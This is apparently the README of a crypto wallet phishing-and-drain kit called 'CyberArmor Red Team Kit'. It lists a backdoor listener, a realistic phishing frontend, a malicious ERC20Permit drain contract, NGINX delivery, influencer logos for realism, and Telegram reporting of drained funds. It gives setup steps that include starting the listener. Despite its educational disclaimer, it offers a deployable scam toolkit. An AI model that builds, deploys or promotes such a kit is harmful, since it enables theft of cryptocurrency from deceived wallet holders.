# 🛡️ CyberArmor Red Team Kit v2.0

> **Purpose:** Fully modular phishing + drain framework simulating high-level exploits in Web3 wallet UX.

---

## 🔧 Modules

| Component | Purpose |
|----------|---------|
| `listener.js` | Backdoor backend for capturing permit + executing drain |
| `frontend/index.html` | Realistic phishing interface with UX flow |
| `MaliciousDrain.sol` | Smart contract with ERC20Permit drain logic |
| `nginx/cyberarmor.conf` | NGINX config for secure HTTPS proxy & frontend delivery |
| `explorer.html` | Redirect mock |
| `assets/` | Logos for backer/influencer visual realism |

---

## ⚙️ Setup

1. Clone repo & install dependencies  
2. Set up `.env` from `.env.example`
3. Deploy contracts (see `contracts/DeploymentSteps.md`)
4. Start backend with:
   ```bash
   pm2 start backend/listener.js --name cyberarmor-listener
5. Deploy phishing frontend to NGINX


📡 Telegram Integration
✅ Permit + Drain logs sent to your bot via TELEGRAM_BOT_TOKEN & TELEGRAM_CHAT_ID

🚨 Disclaimer
This repository is strictly for educational and research purposes.

-------
